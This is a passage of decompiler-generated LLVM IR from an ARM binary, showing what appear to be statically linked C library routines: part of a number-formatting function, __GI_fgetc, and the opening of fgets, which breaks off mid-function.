dec_label_pc_1a03c:                               ; preds = %dec_label_pc_1a034
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a040 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a040 = icmp slt i32 %v0_1a040, 0
  %v2_1a040 = icmp eq i32 %v0_1a040, 0
  store i1 %v2_1a040, i1* %cpsr_z.global-to-local, align 1
  %v4_1a044 = select i1 %tmp285, i32 %v4_19d84135140, i32 101
  store i32 %v4_1a044, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_1a054 = sub i32 0, %v0_1a040
  %storemerge176 = select i1 %v1_1a040, i32 %v4_1a054, i32 %v0_1a040
  %tmp281 = ashr i32 %v0_1a040, 31
  %tmp282 = and i32 %tmp281, 2
  %tmp283 = add nuw nsw i32 %tmp282, 43
  store i32 %storemerge176, i32* %r5.global-to-local, align 4
  store i32 %tmp283, i32* %sl.global-to-local, align 4
  %v2_1a05c = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_1a05c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a064

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a094, %dec_label_pc_1a064, %dec_label_pc_1a03c
  %v2_1a07c = phi i32 [ %v2_1a05c, %dec_label_pc_1a03c ], [ %v6_1a07c, %dec_label_pc_1a064 ], [ %v6_1a07c, %dec_label_pc_1a094 ]
  %v0_1a078 = phi i32 [ %storemerge176, %dec_label_pc_1a03c ], [ %v2_1a080, %dec_label_pc_1a064 ], [ %v2_1a080, %dec_label_pc_1a094 ]
  %v2_1a06c = srem i32 %v0_1a078, 10
  %v1_1a070 = add nsw i32 %v2_1a06c, 48
  store i32 %v1_1a070, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_1a078, i32* %r0.global-to-local, align 4
  %v1_1a07c = trunc i32 %v1_1a070 to i8
  %v3_1a07c = add i32 %v2_1a07c, -1
  %v4_1a07c = inttoptr i32 %v3_1a07c to i8*
  store i8 %v1_1a07c, i8* %v4_1a07c, align 1
  %v5_1a07c = load i32, i32* %r6.global-to-local, align 4
  %v6_1a07c = add i32 %v5_1a07c, -1
  store i32 %v6_1a07c, i32* %r6.global-to-local, align 4
  %v0_1a080 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a080 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a080 = sdiv i32 %v0_1a080, %v1_1a080
  store i32 %v2_1a080, i32* %r0.global-to-local, align 4
  %v0_1a084 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a084 = add i32 %v0_1a084, 1
  store i32 %v1_1a084, i32* %r8.global-to-local, align 4
  %v7_1a088 = icmp eq i32 %v1_1a084, 3
  store i1 %v7_1a088, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1a080, i32* %r5.global-to-local, align 4
  br i1 %v7_1a088, label %dec_label_pc_1a064, label %dec_label_pc_1a094

dec_label_pc_1a094:                               ; preds = %dec_label_pc_1a064
  %v2_1a094 = icmp eq i32 %v2_1a080, 0
  store i1 %v2_1a094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a094, label %dec_label_pc_1a09c, label %dec_label_pc_1a064

dec_label_pc_1a09c:                               ; preds = %dec_label_pc_1a094
  %v1_1a09c = add i32 %v5_1a07c, -2
  store i32 %v1_1a09c, i32* %r3.global-to-local, align 4
  %v0_1a0a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a0a0 = trunc i32 %v0_1a0a0 to i8
  %v4_1a0a0 = inttoptr i32 %v1_1a09c to i8*
  store i8 %v1_1a0a0, i8* %v4_1a0a0, align 1
  %v0_1a0a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a0a4 = add i32 %v0_1a0a4, -1
  store i32 %v1_1a0a4, i32* %r2.global-to-local, align 4
  %v0_1a0a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a0a8 = trunc i32 %v0_1a0a8 to i8
  %v4_1a0a8 = inttoptr i32 %v1_1a0a4 to i8*
  store i8 %v1_1a0a8, i8* %v4_1a0a8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_1a0b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a0b0 = inttoptr i32 %v0_1a0b0 to i32*
  store i32 112, i32* %v1_1a0b0, align 4
  %v3_1a0b0 = add i32 %v0_1a0b0, 4
  %v4_1a0b0 = inttoptr i32 %v3_1a0b0 to i32*
  %v5_1a0b0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_1a0b0, i32* %v4_1a0b0, align 4
  %v0_1a0b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a0b4 = add i32 %v1_1a0b4, 8
  %v3_1a0b4 = inttoptr i32 %v2_1a0b4 to i32*
  store i32 %v0_1a0b4, i32* %v3_1a0b4, align 4
  %v0_1a0b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a0b8 = add i32 %v0_1a0b8, 12
  store i32 %v1_1a0b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a0bc

dec_label_pc_1a0bc:                               ; preds = %dec_label_pc_1a034, %.thread131, %dec_label_pc_1a09c
  %v1_1a0c8.pre = phi i32 [ %v2_19bc0, %.thread131 ], [ %v1_1a0b8, %dec_label_pc_1a09c ], [ %v1_1a0c8.pre.pre, %dec_label_pc_1a034 ]
  %v2_1a0bc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1a0bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a0c0

dec_label_pc_1a0c0:                               ; preds = %dec_label_pc_1a0c0, %dec_label_pc_1a0bc
  %v0_1a0c0 = phi i32 [ %v2_1a0bc, %dec_label_pc_1a0bc ], [ %v4_1a0c0, %dec_label_pc_1a0c0 ]
  %stack_var_-180.0 = phi i32 [ %v3_19a70, %dec_label_pc_1a0bc ], [ %v2_1a0cc, %dec_label_pc_1a0c0 ]
  %v1_1a0c0 = inttoptr i32 %v0_1a0c0 to i32*
  %v2_1a0c0 = load i32, i32* %v1_1a0c0, align 4
  store i32 %v2_1a0c0, i32* %r3.global-to-local, align 4
  %v4_1a0c0 = add i32 %v0_1a0c0, 12
  store i32 %v4_1a0c0, i32* %r2.global-to-local, align 4
  %v3_1a0c8 = icmp ult i32 %v4_1a0c0, %v1_1a0c8.pre
  %v2_1a0cc = sub i32 %stack_var_-180.0, %v2_1a0c0
  store i32 %v2_1a0cc, i32* %lr.global-to-local, align 4
  br i1 %v3_1a0c8, label %dec_label_pc_1a0c0, label %dec_label_pc_1a0d8

dec_label_pc_1a0d8:                               ; preds = %dec_label_pc_1a0c0
  %v3_1a0d8 = load i8, i8* %stack_var_-42, align 1
  %v4_1a0d8 = sext i8 %v3_1a0d8 to i32
  store i32 %v4_1a0d8, i32* %r3.global-to-local, align 4
  store i32 %v4_1a0d8, i32* %r2.global-to-local, align 4
  %v2_1a0dc = icmp eq i8 %v3_1a0d8, 0
  store i1 %v2_1a0dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0dc, label %bb265, label %bb264

bb264:                                            ; preds = %dec_label_pc_1a0d8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb265

bb265:                                            ; preds = %dec_label_pc_1a0d8, %bb264
  %v1_1a130 = phi i32 [ %v4_1a0d8, %dec_label_pc_1a0d8 ], [ 1, %bb264 ]
  %v2_1a0e4 = sub i32 %v2_1a0cc, %v1_1a130
  store i32 %v2_1a0e4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1a0ec = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_1a0ec, i32* %r3.global-to-local, align 4
  %v2_1a0f0 = icmp eq i32 %v2_1a0e4, 0
  store i1 %v2_1a0f0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp266 = icmp slt i32 %v2_1a0e4, 1
  br i1 %tmp266, label %dec_label_pc_1a14c, label %dec_label_pc_1a104

dec_label_pc_1a104:                               ; preds = %bb265
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v3_1a108 = load i32, i32* %v2_19a6c, align 4
  store i32 %v3_1a108, i32* %r3.global-to-local, align 4
  %v1_1a10c = and i32 %v3_1a108, 8
  %v2_1a10c = icmp eq i32 %v1_1a10c, 0
  store i1 %v2_1a10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a10c, label %dec_label_pc_1a124, label %dec_label_pc_1a114

dec_label_pc_1a114:                               ; preds = %dec_label_pc_1a104
  store i32 ptrtoint (i32* @global_var_256d7.1646 to i32), i32* %r3.global-to-local, align 4
  %v1_1a118 = add i32 %v1_1a0c8.pre, 12
  store i32 %v1_1a118, i32* %r6.global-to-local, align 4
  %v1_1a11c = inttoptr i32 %v1_1a0c8.pre to i32*
  store i32 160, i32* %v1_1a11c, align 4
  %v3_1a11c = add i32 %v1_1a0c8.pre, 4
  %v4_1a11c = inttoptr i32 %v3_1a11c to i32*
  %v5_1a11c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a11c, i32* %v4_1a11c, align 4
  %v6_1a11c = add i32 %v1_1a0c8.pre, 8
  %v7_1a11c = inttoptr i32 %v6_1a11c to i32*
  %v8_1a11c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1a11c, i32* %v7_1a11c, align 4
  br label %dec_label_pc_1a150

dec_label_pc_1a124:                               ; preds = %dec_label_pc_1a104
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v1_1a128 = add i32 %arg4, 16
  %v2_1a128 = inttoptr i32 %v1_1a128 to i32*
  %v3_1a128 = load i32, i32* %v2_1a128, align 4
  store i32 %v3_1a128, i32* %r3.global-to-local, align 4
  %v7_1a12c = icmp eq i32 %v3_1a128, 48
  store i1 %v7_1a12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a12c, label %.thread48.thread62, label %bb267

bb267:                                            ; preds = %dec_label_pc_1a124
  store i32 %v2_1a0cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a14c

.thread48.thread62:                               ; preds = %dec_label_pc_1a124
  %v4_1a138 = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_1a0c8.pre, i32* %r6.global-to-local, align 4
  %v3_1a140 = add i32 %v4_1a138, %v2_1a0e4
  store i32 %v3_1a140, i32* %r3.global-to-local, align 4
  store i32 %v3_1a140, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1a150

dec_label_pc_1a14c:                               ; preds = %bb267, %bb265
  store i32 %v1_1a0c8.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a150

dec_label_pc_1a150:                               ; preds = %.thread48.thread62, %dec_label_pc_1a114, %dec_label_pc_1a14c
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1a154 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1a154, i32* %r5.global-to-local, align 4
  %v3_1a160.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_1a158

dec_label_pc_1a158:                               ; preds = %dec_label_pc_1a180, %dec_label_pc_1a150
  %v0_1a158 = phi i32 [ %v1_1a174, %dec_label_pc_1a180 ], [ %v2_1a154, %dec_label_pc_1a150 ]
  %v1_1a158 = inttoptr i32 %v0_1a158 to i32*
  %v2_1a158 = load i32, i32* %v1_1a158, align 4
  store i32 %v2_1a158, i32* %r1.global-to-local, align 4
  %v3_1a158 = add i32 %v0_1a158, 4
  %v4_1a158 = inttoptr i32 %v3_1a158 to i32*
  %v5_1a158 = load i32, i32* %v4_1a158, align 4
  store i32 %v5_1a158, i32* %r2.global-to-local, align 4
  %v6_1a158 = add i32 %v0_1a158, 8
  %v7_1a158 = inttoptr i32 %v6_1a158 to i32*
  %v8_1a158 = load i32, i32* %v7_1a158, align 4
  store i32 %v8_1a158, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_1a160.pre, i32* %ip.global-to-local, align 4
  store i32 106860, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_1a160.pre)
  %v0_1a16c = load i32, i32* %r5.global-to-local, align 4
  %v1_1a16c = add i32 %v0_1a16c, 4
  %v2_1a16c = inttoptr i32 %v1_1a16c to i32*
  %v3_1a16c = load i32, i32* %v2_1a16c, align 4
  store i32 %v3_1a16c, i32* %r3.global-to-local, align 4
  %v0_1a170 = load i32, i32* %r0.global-to-local, align 4
  %v9_1a170 = icmp eq i32 %v0_1a170, %v3_1a16c
  store i1 %v9_1a170, i1* %cpsr_z.global-to-local, align 1
  %v1_1a174 = add i32 %v0_1a16c, 12
  store i32 %v1_1a174, i32* %r5.global-to-local, align 4
  br i1 %v9_1a170, label %dec_label_pc_1a180, label %bb268

bb268:                                            ; preds = %dec_label_pc_1a158
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a1a0

dec_label_pc_1a180:                               ; preds = %dec_label_pc_1a158
  %v0_1a184.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1a180 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a180 = icmp ult i32 %v1_1a174, %v1_1a180
  %v9_1a180 = icmp eq i32 %v1_1a174, %v1_1a180
  store i1 %v9_1a180, i1* %cpsr_z.global-to-local, align 1
  %v2_1a184 = add i32 %v0_1a184.pre, %v3_1a16c
  store i32 %v2_1a184, i32* %r7.global-to-local, align 4
  br i1 %v3_1a180, label %dec_label_pc_1a158, label %dec_label_pc_1a1a0

dec_label_pc_1a198:                               ; preds = %.thread15, %bb250
  %v0_1a198 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1a198, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19ec8

dec_label_pc_1a1a0:                               ; preds = %dec_label_pc_1a180, %bb268
  %v0_1a1a0 = phi i32 [ -1, %bb268 ], [ %v2_1a184, %dec_label_pc_1a180 ]
  store i32 %v0_1a1a0, i32* %r0.global-to-local, align 4
  %v2_1a1a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1a1a8, i32* %r4.global-to-local, align 4
  ret i32 %v0_1a1a0

; uselistorder directives
  uselistorder i32 %v0_1a1a0, { 1, 0 }
  uselistorder i32 %v1_1a180, { 1, 0 }
  uselistorder i32 %v1_1a174, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1a158, { 2, 1, 0 }
  uselistorder i32 %v2_1a0cc, { 0, 1, 3, 2 }
  uselistorder i32 %v4_1a0c0, { 1, 2, 0 }
  uselistorder i32 %v0_1a0c0, { 1, 0 }
  uselistorder i32 %v1_1a0c8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1a080, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1a07c, { 2, 1, 0 }
  uselistorder i32 %storemerge176, { 1, 0 }
  uselistorder i32 %v0_1a040, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1a010, { 1, 0 }
  uselistorder i32 %v1_1a010, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1a00c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_19f7c, { 2, 1, 0 }
  uselistorder i32 %v2_19f08, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_19ef8, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_19ee4, { 1, 0, 2 }
  uselistorder i32 %v5_19ee0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19f6424, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_19e98, { 1, 0 }
  uselistorder i32 %v1_19e90, { 1, 2, 0 }
  uselistorder i32 %v2_19e84, { 1, 0 }
  uselistorder i32 %v1_19e84, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19e84, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_19e54, { 1, 0 }
  uselistorder i32 %v0_19e54, { 0, 2, 1 }
  uselistorder i32 %v1_19e3c, { 1, 0 }
  uselistorder i1 %v2_19e2c, { 1, 0 }
  uselistorder i32 %v1_19e28, { 3, 2, 1, 0 }
  uselistorder i32 %v2_19e24, { 1, 0 }
  uselistorder i1 %v2_19e14, { 1, 0 }
  uselistorder i32 %stack_var_-184.7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_19e08, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_19dbc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19dbc, { 1, 0, 2 }
  uselistorder i1 %v2_19da4, { 1, 0 }
  uselistorder i32 %v5_19d8c, { 1, 0 }
  uselistorder i32 %v0_19d78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19d60, { 1, 2, 0 }
  uselistorder i32 %v2_19d5c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_19d10, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-184.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_19c8c, { 1, 0 }
  uselistorder i32 %v11_19c64, { 0, 2, 3, 1 }
  uselistorder i32 %v3_19c08, { 1, 0 }
  uselistorder i32 %v1_19c00, { 1, 0, 3, 2 }
  uselistorder i32 %v0_19c60, { 1, 0 }
  uselistorder i32 %v5_19bb0, { 1, 0 }
  uselistorder i32 %v0_19ab8.v1_19acc6, { 1, 0 }
  uselistorder i1 %v7_19ac0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 9, 0, 1, 4, 5, 6, 7, 2, 8, 10, 3, 11 }
  uselistorder i32* %r8.global-to-local, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 25, 27, 26, 28, 29, 30, 31, 32, 33, 16, 17, 18, 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 14, 15, 3, 4, 5, 6, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r6.global-to-local, { 7, 13, 8, 14, 9, 10, 11, 12, 6, 0, 1, 2, 3, 4, 5, 15 }
  uselistorder i32* %r5.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 12 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 2, 52, 53, 3, 4, 5, 6, 7, 9, 24, 10, 11, 15, 12, 13, 14, 16, 8, 17, 18, 19, 20, 21, 22, 23, 36, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 54, 55, 56, 57, 58, 59, 1, 63, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 21, 22, 23, 24, 25, 26, 27, 28, 1, 8, 2, 3, 9, 4, 5, 6, 11, 7, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 26, 27, 28, 29, 30, 5, 6, 7, 2, 3, 4, 8, 9, 10, 14, 11, 12, 15, 13, 16, 17, 1, 18, 19, 20, 21, 22, 23, 24, 25, 32, 33, 35, 34, 36, 31, 0 }
  uselistorder i32* %r0.global-to-local, { 26, 27, 28, 29, 2, 30, 31, 20, 16, 17, 18, 11, 12, 19, 13, 14, 8, 21, 15, 7, 22, 23, 9, 10, 1, 24, 25, 32, 4, 3, 6, 5, 33, 34, 0 }
  uselistorder i32* %lr.global-to-local, { 8, 9, 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0, 1, 2, 3, 4, 5, 6, 7, 46, 8, 9, 10, 11, 12, 13, 14, 15, 45, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 44, 29, 30, 31, 32, 33, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 5, 0, 6, 3, 1, 7, 4 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 102, { 1, 2, 3, 4, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 101, { 0, 2, 1 }
  uselistorder i32 %arg4, { 7, 6, 8, 9, 5, 4, 1, 2, 10, 0, 11, 12, 3, 13, 14 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 5, 3, 6, 7, 8, 10, 9, 11, 12 }
  uselistorder double %arg2, { 0, 1, 6, 5, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_1a198, { 1, 0 }
  uselistorder label %dec_label_pc_1a150, { 2, 0, 1 }
  uselistorder label %bb265, { 1, 0 }
  uselistorder label %dec_label_pc_1a0bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a034, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a00c, { 1, 0 }
  uselistorder label %.thread40, { 1, 0 }
  uselistorder label %dec_label_pc_19fe4, { 1, 0 }
  uselistorder label %dec_label_pc_19fc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19f74, { 2, 1, 0 }
  uselistorder label %.thread28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19ec8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_19eb8, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %bb245, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %.thread160, { 1, 0 }
  uselistorder label %._crit_edge100, { 1, 0 }
  uselistorder label %bb239, { 1, 0 }
  uselistorder label %bb237, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %dec_label_pc_19de0, { 2, 1, 0 }
  uselistorder label %bb231, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19cec, { 1, 0 }
  uselistorder label %.thread131, { 1, 0 }
  uselistorder label %dec_label_pc_19b8c, { 1, 0 }
  uselistorder label %dec_label_pc_19aa4, { 1, 0 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %bb217, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_1a1ac:
  %v0_1a1c0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_1a1c0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a1ac
  %v1_1a1c4 = load i32, i32* @r4, align 4
  %v3_1a1c4 = xor i32 %v1_1a1c4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a1ac, %bb
  %v9_1a1cc = phi i32 [ %arg1, %dec_label_pc_1a1ac ], [ %v3_1a1c4, %bb ]
  %v0_1a1c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a1c8, label %bb3, label %.thread1

bb3:                                              ; preds = %.thread
  br label %.thread1

.thread1:                                         ; preds = %.thread, %bb3
  ret i32 %v9_1a1cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a1d0 = load i32, i32* @r4, align 4
  store i32 %v3_1a1d0, i32* %stack_var_-12, align 4
  %v6_1a1d0 = load i32, i32* @r5, align 4
  %v1_1a1d4 = add i32 %arg1, 52
  %v2_1a1d4 = inttoptr i32 %v1_1a1d4 to i32*
  %v3_1a1d4 = load i32, i32* %v2_1a1d4, align 4
  %v2_1a1d8 = icmp eq i32 %v3_1a1d4, 0
  %v2_1a1dc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg1, i32* @r5, align 4
  br i1 %v2_1a1d8, label %dec_label_pc_1a20c, label %dec_label_pc_1a1e8

dec_label_pc_1a1e8:                               ; preds = %entry
  %v1_1a1e8 = add i32 %arg1, 16
  %v2_1a1e8 = inttoptr i32 %v1_1a1e8 to i32*
  %v3_1a1e8 = load i32, i32* %v2_1a1e8, align 4
  %v1_1a1ec = add i32 %arg1, 24
  %v2_1a1ec = inttoptr i32 %v1_1a1ec to i32*
  %v3_1a1ec = load i32, i32* %v2_1a1ec, align 4
  %v3_1a1f0 = icmp ult i32 %v3_1a1e8, %v3_1a1ec
  br i1 %v3_1a1f0, label %.thread, label %dec_label_pc_1a200

.thread:                                          ; preds = %dec_label_pc_1a1e8
  %v2_1a1f4 = inttoptr i32 %v3_1a1e8 to i8*
  %v3_1a1f4 = load i8, i8* %v2_1a1f4, align 1
  %v4_1a1f4 = zext i8 %v3_1a1f4 to i32
  store i32 %v4_1a1f4, i32* %r4.global-to-local, align 4
  %v6_1a1f4 = add i32 %v3_1a1e8, 1
  store i32 %v6_1a1f4, i32* %v2_1a1e8, align 4
  br label %dec_label_pc_1a270

dec_label_pc_1a200:                               ; preds = %dec_label_pc_1a1e8
  %v1_1a200 = inttoptr i32 %arg1 to i8*
  %v2_1a200 = call i32 @getc_unlocked(i8* %v1_1a200)
  store i32 %v2_1a200, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a270

dec_label_pc_1a20c:                               ; preds = %entry
  %v1_1a20c = add i32 %arg1, 56
  store i32 %v1_1a20c, i32* @r4, align 4
  store i32 %v1_1a20c, i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_1a1dc, i32* @r0, align 4
  %v1_1a224 = call i32 @_pthread_cleanup_push_defer()
  %v0_1a228 = load i32, i32* @r4, align 4
  %v2_1a234 = call i32 @__pthread_return_0(i32 %v0_1a228)
  %v0_1a238 = load i32, i32* @r5, align 4
  %v1_1a238 = add i32 %v0_1a238, 16
  %v2_1a238 = inttoptr i32 %v1_1a238 to i32*
  %v3_1a238 = load i32, i32* %v2_1a238, align 4
  %v1_1a23c = add i32 %v0_1a238, 24
  %v2_1a23c = inttoptr i32 %v1_1a23c to i32*
  %v3_1a23c = load i32, i32* %v2_1a23c, align 4
  %v3_1a240 = icmp ult i32 %v3_1a238, %v3_1a23c
  br i1 %v3_1a240, label %.thread2, label %dec_label_pc_1a250

.thread2:                                         ; preds = %dec_label_pc_1a20c
  %v2_1a244 = inttoptr i32 %v3_1a238 to i8*
  %v3_1a244 = load i8, i8* %v2_1a244, align 1
  %v4_1a244 = zext i8 %v3_1a244 to i32
  store i32 %v4_1a244, i32* %r4.global-to-local, align 4
  %v6_1a244 = add i32 %v3_1a238, 1
  store i32 %v6_1a244, i32* %v2_1a238, align 4
  br label %dec_label_pc_1a25c

dec_label_pc_1a250:                               ; preds = %dec_label_pc_1a20c
  %v1_1a254 = inttoptr i32 %v0_1a238 to i8*
  %v2_1a254 = call i32 @getc_unlocked(i8* %v1_1a254)
  store i32 %v2_1a254, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a25c

dec_label_pc_1a25c:                               ; preds = %.thread2, %dec_label_pc_1a250
  store i32 %v2_1a1dc, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 107120, i32* @lr, align 4
  %v1_1a26c = call i32 @_pthread_cleanup_pop_restore()
  br label %dec_label_pc_1a270

dec_label_pc_1a270:                               ; preds = %.thread, %dec_label_pc_1a200, %dec_label_pc_1a25c
  %v0_1a270 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a278 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a278, i32* @r4, align 4
  store i32 %v6_1a1d0, i32* @r5, align 4
  ret i32 %v0_1a270

; uselistorder directives
  uselistorder i32 %v3_1a238, { 1, 0, 2 }
  uselistorder i32 %v3_1a1e8, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_1a270, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a25c, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1a28c = load i32, i32* @r4, align 4
  store i32 %v3_1a28c, i32* %stack_var_-24, align 4
  %v6_1a28c = load i32, i32* @r5, align 4
  %v9_1a28c = load i32, i32* @r6, align 4
  %v12_1a28c = load i32, i32* @r7, align 4
  %v1_1a290 = add i32 %arg3, 52
  %v2_1a290 = inttoptr i32 %v1_1a290 to i32*
  %v3_1a290 = load i32, i32* %v2_1a290, align 4
  %v1_1a294 = sub i32 1, %v3_1a290
